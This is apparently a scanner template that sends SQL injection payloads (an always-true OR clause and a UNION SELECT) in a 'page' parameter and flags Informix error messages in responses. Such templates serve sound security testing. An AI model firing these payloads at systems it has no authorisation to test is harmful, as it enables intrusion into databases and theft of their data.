id: sqli6-informix-07
name: 'SQLi informix probe in page'
severity: high
type: active
tags:
  - sqli
  - injection
  - informix
description: 'Triggers informix error via page'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      page:
        - ''') OR (''1''=''1'
        - ''') UNION SELECT 1,2--'
    matchers:
      - type: regex
        part: body
        regex:
          - 'Informix'
          - 'ISAM error'
